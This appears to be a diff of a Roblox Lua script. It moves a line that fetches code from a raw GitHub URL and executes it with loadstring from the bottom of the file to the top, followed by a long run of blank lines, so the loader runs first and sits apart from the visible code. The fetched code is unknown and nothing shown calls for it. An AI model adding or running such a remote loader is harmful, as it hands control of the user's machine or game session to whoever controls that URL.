@@ -1,3 +1,30 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/abwalt/yuhhhh/main/notcool"))()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 local keys = {
@@ -35,5 +62,3 @@ while true do
     end
     wait()
 end
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/abwalt/yuhhhh/main/notcool"))()
